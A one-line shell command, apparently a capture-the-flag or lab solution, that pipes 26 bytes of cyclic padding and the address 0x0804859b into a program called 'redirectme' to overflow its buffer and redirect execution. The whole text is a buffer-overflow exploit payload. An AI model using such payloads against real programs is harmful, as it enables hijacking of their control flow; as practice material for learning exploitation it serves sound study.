printf 'aaaabaaacaaadaaaeaaafaaaga\x9b\x85\x04\x08' | ./redirectme
